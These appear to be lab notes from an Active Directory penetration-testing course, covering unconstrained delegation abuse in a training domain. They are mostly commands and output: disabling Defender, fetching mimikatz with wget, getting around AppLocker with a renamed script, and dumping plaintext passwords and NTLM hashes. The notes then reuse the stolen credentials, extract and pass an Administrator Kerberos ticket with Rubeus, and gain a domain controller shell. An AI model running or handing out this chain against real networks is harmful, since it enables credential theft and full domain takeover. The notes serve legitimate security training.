#### Theory can be found in [[2. Domain Privilege Escalation#3. KUD]] ####

- student303 is a local administrator and has winrm rights over `DCORP-APPSRV` (`student303` is a member of `dcorp\RDPUsers` that has Administrative access to the computer).
```
PS C:\AD\MyTools> winrs -r:DCORP-ADMINSRV hostname;whoami /all
dcorp-adminsrv


USER INFORMATION
----------------

User Name        SID
================ =============================================
dcorp\student303 S-1-5-21-719815819-3726368948-3917688648-4103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
dcorp\RDPUsers                             Group            S-1-5-21-719815819-3726368948-3917688648-1123 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

- Get a `PowerShell` session at `DCORP-ADMINSRV`.
```
PS C:\AD\MyTools> Enter-PSSession -ComputerName DCORP-ADMINSRV
[DCORP-ADMINSRV]: PS C:\Users\student303\Documents>
```

- Local Enumeration on `DCORP-ADMINSRV`.
```
[DCORP-ADMINSRV]: PS C:\Users\student303\Documents> Get-MPComputerStatus


AMEngineVersion                  : 1.1.19800.4
AMProductVersion                 : 4.18.2210.6
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2210.6
AntispywareEnabled               : True
AntispywareSignatureAge          : 266
AntispywareSignatureLastUpdated  : 11/14/2022 10:38:25 PM
AntispywareSignatureVersion      : 1.379.386.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 266
AntivirusSignatureLastUpdated    : 11/14/2022 10:38:25 PM
AntivirusSignatureVersion        : 1.379.386.0
BehaviorMonitorEnabled           : True
ComputerID                       : 0768675E-0583-445B-A5D0-731685CE7439

<snip>

[DCORP-ADMINSRV]: PS C:\Users\student303\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
The command completed with one or more errors.

[DCORP-ADMINSRV]: PS C:\> dir C:\Users


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/11/2022   5:21 AM                Administrator
d-----        11/14/2022   4:50 AM                Administrator.dcorp
d-----        11/14/2022   5:23 AM                appadmin
d-r---        11/11/2022  12:55 AM                Public
d-----          3/4/2023   1:40 AM                srvadmin
d-----          8/8/2023   3:22 AM                student303
d-----        11/14/2022   4:46 AM                websvc
```

- Use `mimikatz.exe` to dump credentials from `DCORP-APPSRV`.
```
[DCORP-ADMINSRV]: PS C:\> cd C:\Windows\Tasks
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> dir
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> Set-MpPreference -DisableRealtimeMonitoring $true
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> wget http://172.16.99.3/mimikatz.exe -O m.exe
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> .\m.exe
Program 'm.exe' failed to run: This program is blocked by group policy. For more information, contact your system
administrator.
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

- Enumerate the Applocker configuration on `on dcorp-adminsrv`.
```
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Appx
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Dll
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Msi
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Exe

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
    AllowWindows    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe\38a711c4-c0b8-46ee-98cf-c9636366548e
[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Exe\38a711c4-c0b8-46ee-98cf-c9636366548e

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe\38a711c4-c0b8-46ee-98cf-c9636366548e
    Value    REG_SZ    <FilePublisherRule Id="38a711c4-c0b8-46ee-98cf-c9636366548e" Name="Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>

<snip>

[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
    Value    REG_SZ    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d" Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>

[DCORP-ADMINSRV]: PS C:\Windows\Tasks> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c
    Value    REG_SZ    <FilePathRule Id="9428c672-5fc3-47f4-808a-a0011f36dd2c" Name="(Default Rule) All scripts located in the Windows folder" Description="Allows members of the Everyone group to run scripts that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*"/></Conditions></FilePathRule>
```

- We can only run `PowerShell` scripts from either `C:\Windows` or `C:\Program Files`.
- After we modify `Invoke-Mimi.ps1` to include the function call in the script itself (`Invoke-Test -Command "sekurlsa::logonpasswords"`) we transfer the modified script (`Invoke-Test.ps1` - function is renamed as well) to the target server and run it.
```
[DCORP-ADMINSRV]: PS C:\Windows> .\Invoke-Test.ps1

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 61356 (00000000:0000efac)
Session           : Service from 0
User Name         : appadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/4/2023 2:15:25 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1117
        msv :
         [00000003] Primary
         * Username : appadmin
         * Domain   : dcorp
         * NTLM     : d549831a955fee51a43c83efb3928fa7
         * SHA1     : 07de541a289d45a577f68c512c304dfcbf9e4816
         * DPAPI    : a5d49d98574a7574ab70fa77797c367d
        tspkg :
        wdigest :
         * Username : appadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : appadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ActuallyTheWebServer1
        ssp :
        credman :

<snip>

Authentication Id : 0 ; 1094055 (00000000:0010b1a7)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/4/2023 2:40:01 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1115
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : dcorp
         * NTLM     : a98e18228819e8eec3dfa33cb68b0728
         * SHA1     : f613d1bede9a620ba16ae786e242d3027809c82a
         * DPAPI    : a593cded7a622d70818fb3315264a140
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

<snip>

Authentication Id : 0 ; 60233 (00000000:0000eb49)
Session           : Service from 0
User Name         : websvc
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/4/2023 2:15:25 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1114
        msv :
         [00000003] Primary
         * Username : websvc
         * Domain   : dcorp
         * NTLM     : cc098f204c5887eaa8253e7c2749156f
         * SHA1     : 36f2455c767ac9945fdc7cd276479a6a011e154b
         * DPAPI    : afa3166d71b438639f1c77118153d316
        tspkg :
        wdigest :
         * Username : websvc
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : websvc
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : AServicewhichIsNotM3@nttoBe
        ssp :
        credman :
```

- Enumerate local admin rights to domain computers for `dcorp\appadmin`.
```
PS C:\AD\MyTools> $appadminpasswd = ConvertTo-SecureString -AsPlainText -Force -String "*ActuallyTheWebServer1"
PS C:\AD\MyTools> $appadmincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "dcorp\appadmin",$appadminpasswd
PS C:\AD\MyTools> foreach($line in Get-Content .\hosts.txt) {Test-AdminAccess -ComputerName $line -Credential $appadmincred -WarningAction SilentlyContinue}

ComputerName IsAdmin
------------ -------
cn             False
DCORP-DC       False
DCORP-ADM...    True
DCORP-APPSRV    True
DCORP-CI       False
DCORP-MGMT     False
DCORP-MSSQL    False
DCORP-SQL1     False
```

- Enumerate local admin rights to domain computers for `dcorp\websvc`.
```
PS C:\AD\MyTools> $websvcpasswd = ConvertTo-SecureString -AsPlainText -Force -String "AServicewhichIsNotM3@nttoBe"
PS C:\AD\MyTools> $websvccred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "dcorp\websvc",$websvcpasswd
PS C:\AD\MyTools> foreach($line in Get-Content .\hosts.txt) {Test-AdminAccess -ComputerName $line -Credential $websvccred -WarningAction SilentlyContinue}

ComputerName IsAdmin
------------ -------
cn             False
DCORP-DC       False
DCORP-ADM...   False
DCORP-APPSRV   False
DCORP-CI       False
DCORP-MGMT     False
DCORP-MSSQL    False
DCORP-SQL1     False
```


- Find Unconstrained Delegation servers.
```
PS C:\AD\MyTools> Get-DomainUser -Unconstrained | Select-Object samaccountname
PS C:\AD\MyTools> Get-DomainComputer -Unconstrained | Select-Object samaccountname

samaccountname
--------------
DCORP-DC$
DCORP-APPSRV$
```

- Access `DCORP-APPSRV` remotely.
```
PS C:\AD\MyTools> Enter-PSSession -ComputerName DCORP-APPSRV -Credential $appadmincred
[DCORP-APPSRV]: PS C:\Users\appadmin\Documents>
```

- Transfer the necessary tools.
```
[DCORP-APPSRV]: PS C:\Windows\Tasks> Set-MpPreference -DisableRealtimeMonitoring $true
[DCORP-APPSRV]: PS C:\Windows\Tasks> net use n: \\172.16.100.3\MyTools /user:dcorp\student303 a5fdNPDwScrD7T2A
The command completed successfully.

[DCORP-APPSRV]: PS C:\Windows\Tasks> cp //172.16.100.3/MyTools/Rubeus.exe .
```

#### - KUD Abuse 1 ####
- Extract an Administrator TGT from the target server.

```
[DCORP-APPSRV]: PS C:\Windows\Tasks> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x53daab

 ------------------------------------------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                                   | Service                                                             | EndTime              |
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 | 0x545e85 | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 11:01:04 PM |
 | 0x543dd8 | appadmin @ DOLLARCORP.MONEYCORP.LOCAL      | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:57:02 PM |
 | 0x53ffbb | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:58:04 PM |
 | 0x53f042 | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:57:04 PM |
 | 0x53c4fc | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:56:04 PM |
 | 0x53b5cf | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:55:04 PM |
 | 0x53852b | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:52:04 PM |
 | 0xacdbc  | appadmin @ DOLLARCORP.MONEYCORP.LOCAL      | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 9:25:38 PM  |
 | 0xacdbc  | appadmin @ DOLLARCORP.MONEYCORP.LOCAL      | LDAP/dcorp-dc.dollarcorp.moneycorp.local/dollarcorp.moneycorp.local | 8/8/2023 9:25:38 PM  |
 | 0x3e4    | dcorp-appsrv$ @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 8:21:34 PM  |
 | 0x3e4    | dcorp-appsrv$ @ DOLLARCORP.MONEYCORP.LOCAL | cifs/dcorp-dc.dollarcorp.moneycorp.local                            | 8/8/2023 8:21:34 PM  |
 | 0x3e4    | dcorp-appsrv$ @ DOLLARCORP.MONEYCORP.LOCAL | ldap/dcorp-dc.dollarcorp.moneycorp.local/dollarcorp.moneycorp.local | 8/8/2023 10:41:42 AM |
 | 0x544dd3 | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 11:00:04 PM |
 | 0x543b1b | appadmin @ DOLLARCORP.MONEYCORP.LOCAL      | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:57:02 PM |
 | 0x5438ce | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:59:04 PM |
 | 0x5402c4 | appadmin @ DOLLARCORP.MONEYCORP.LOCAL      | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:57:02 PM |
 | 0x53e23b | appadmin @ DOLLARCORP.MONEYCORP.LOCAL      | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:57:02 PM |
 | 0x53daab | appadmin @ DOLLARCORP.MONEYCORP.LOCAL      | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:57:02 PM |
 | 0x53a67f | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:54:04 PM |
 | 0x53968b | Administrator @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 10:53:04 PM |
 | 0x3e7    | dcorp-appsrv$ @ DOLLARCORP.MONEYCORP.LOCAL | krbtgt/DOLLARCORP.MONEYCORP.LOCAL                                   | 8/8/2023 8:26:43 PM  |
 | 0x3e7    | dcorp-appsrv$ @ DOLLARCORP.MONEYCORP.LOCAL | cifs/dcorp-dc.dollarcorp.moneycorp.local/dollarcorp.moneycorp.local | 8/8/2023 8:26:43 PM  |
 | 0x3e7    | dcorp-appsrv$ @ DOLLARCORP.MONEYCORP.LOCAL | DCORP-APPSRV$                                                       | 8/8/2023 8:26:43 PM  |
 | 0x3e7    | dcorp-appsrv$ @ DOLLARCORP.MONEYCORP.LOCAL | LDAP/dcorp-dc.dollarcorp.moneycorp.local/dollarcorp.moneycorp.local | 8/8/2023 8:26:43 PM  |
 | 0x3e7    | dcorp-appsrv$ @ DOLLARCORP.MONEYCORP.LOCAL | LDAP/dcorp-dc.dollarcorp.moneycorp.local                            | 3/4/2023 11:18:45 AM |
 ------------------------------------------------------------------------------------------------------------------------------------------------------

[DCORP-APPSRV]: PS C:\Windows\Tasks> .\Rubeus.exe dump /luid:0x53f042 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


Action: Dump Kerberos Ticket Data (All Users)

[*] Target LUID     : 0x53f042
[*] Current LUID    : 0x53daab

  UserName                 : Administrator
  Domain                   : dcorp
  LogonId                  : 0x53f042
  UserSID                  : S-1-5-21-719815819-3726368948-3917688648-500
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 8/8/2023 12:57:05 PM
  LogonServer              :
  LogonServerDNSDomain     : DOLLARCORP.MONEYCORP.LOCAL
  UserPrincipalName        :


    ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
    ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
    UserName                 :  Administrator
    UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
    StartTime                :  8/8/2023 12:57:05 PM
    EndTime                  :  8/8/2023 10:57:04 PM
    RenewTill                :  8/15/2023 12:57:04 PM
    Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  yfKB4LJ8J3Ir8I8wuj51jS20dvzwfqC+frazLAXoPAc=
    Base64EncodedTicket   :

      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
```

- Use the extracted ticket to gain DA privileges.
```
PS C:\AD\MyTools> .\Rubeus.exe ptt /ticket:doIGZjCCBmKgAwIBBaEDAgEWooIFNjCCBTJhggUuMIIFKqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBNIwggTOoAMCARKhAwIBAqKCBMAEggS8/wE6AOUG6sc9DNv294ZL/eemeWqoOJruSd0PKCqfLtpgG/fzpGznukJ0UczAxlsQ/MBgmBmwbJvc6iFgSzkO+qnTwMTM2+dMv/wVhbKovtfEzp1Qa8fhzAiis7O/lwnUi4Q8Na3TFIkdJl7XV6VzbzsNxZaXTYuLT+CvkTd+SVExoa6WHZ1RJYSI45/0dc1DiOI43U5oWHFfbMJnzVugRNyFYBoQ6YyCn7KoqYlvzGqLtc/wmnu4HOu/NcDKt3uiaxAA847D5cK8mQeKnGQCIwDTyRt60BHrASh3xNhVtNWy3EVYjTbBAPGwJ7YevBuUOX+f2nmir5TrDbnSmPpJKqVf7AoGD0D1a3jNlE2mCdBnLHcPLuG2BnDc543wYwmBs4lB++v/wPdtJJxRm7xAzTnPajUCUqUa++RxNBHigRtsqCJm5voF/uZv5wbmA+005Gtf9AjocFeICy+mp26eAB1s6Zmp6H5qk/8W94lHzC7furT8uivdhdgXHE74V7SP4M0q+gNxTF4hiuF1TdaM+Ret9Sej1oDwbnaHazbwiO3LOduoJV831nZXPoCeBVwlbE139B0nk2dXOQgJMb9lh77/mL0VMoresuF/t9mYp4+HLdtge7ju52XkZHIbUahoj7CExRLg/oM66D2/W/MOlVGV3ghREEpigY5iue5sKW0i0MJXWt2SZwm+ebwmwSF9xWTaj98PM2mEXiiEPgURHSAff7FQ6+FvDI2VZg0DuDwCjDrf30Pl5zTOXfdkx1Z385wx/5ktp946yTobqWltkGcdQaxz1ONkBbmIB25IxLytSF7lu8dPe7dUPdbwjVZvp6j8om8dcAzSoD5OVsYF0aWWi2bUhNG0vaJChsN7QfNMtEaS+cm1xlYAjOSKpNlYjWhPeSjMgMH0a6eH4di6KOcSO4JM0Y7lAt69CDcJQkxDEa7cBv9NOfxIPYxQNxI40vrwemMGbWWPH5gizt6sukvasuXB4oyrvka4mKD5oPDURI1ULObQRgm37yVnRYKTw910wk71DWTSlOmX7Qvan+3kCeJzOKWrRXJk55iX+i7O3u8J3pLwNkwijnReWSADWXwcQNG8bCIVG85cfefLP8a1WWE6o3adcnwMlBIPdnPxUxRCZM5mqoFzolK/L95lL8GoGqXkdrbmM+D/d2KVGmuNsmP8DOLJ9ReMd3aQDMUd7pJllDc0vKDFbP8PfjJXMUxt/l7kPHx2s3rwaXu+ndsaJDDqe4ZIfs4XLDnWRKuzeB5IlyN7RZ+AbNs/eii57fp4fz9uq0UubWEi+3lVdEOsvp4r6l+l+AOp/pnKPXQHEEgi4wSooWnk3P3aLXT+Y6+/qi6rda8sp+42yyF+i9T0XHInPyfdI7/98JWN0wfbjQ9h9sNBEvW3lR417qi9qocIRiT143EY3Z3wpA8A96p7cF4JKM4yO3g7XLyX/YFfV3BJhnIOEQODfpZFAiMiXj78xCNvEbIIXuNcJ2fzkR3MCVVeruknXS0yRL1TAzSBHVqx8dUyn+L8WIUaB59V6YgS8oF15HyKh8sQNfjzwI7d0JfrEskAGNFt7mvHqBcMpUZ7xrrWo7BHpPcjlIo8CLLs0AbzctVn2afXo4IBGjCCARagAwIBAKKCAQ0EggEJfYIBBTCCAQGggf4wgfswgfigKzApoAMCARKhIgQgyfKB4LJ8J3Ir8I8wuj51jS20dvzwfqC+frazLAXoPAehHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBgoQAApREYDzIwMjMwODA4MTk1NzA1WqYRGA8yMDIzMDgwOTA1NTcwNFqnERgPMjAyMzA4MTUxOTU3MDRaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTA==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


[*] Action: Import Ticket
[+] Ticket successfully imported!
PS C:\AD\MyTools> klist

Current LogonId is 0:0x3f47b03

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 8/8/2023 12:57:05 (local)
        End Time:   8/8/2023 22:57:04 (local)
        Renew Time: 8/15/2023 12:57:04 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

PS C:\AD\MyTools> Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\Administrator\Documents> hostname
dcorp-dc
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\Administrator\Documents> whoami
dcorp\administrator
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\Administrator\Documents>
```

#### [[- KUD Abuse 2]] ####
- On the compromised server `DCORP-APPSRV` wait and listen using `Rubeus` for an account to authenticate in order to capture his TGT.
```
[DCORP-APPSRV]: PS C:\Windows\Tasks> .\Rubeus.exe monitor /interval:10 /targetuser:DCORP-DC$ /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: TGT Monitoring
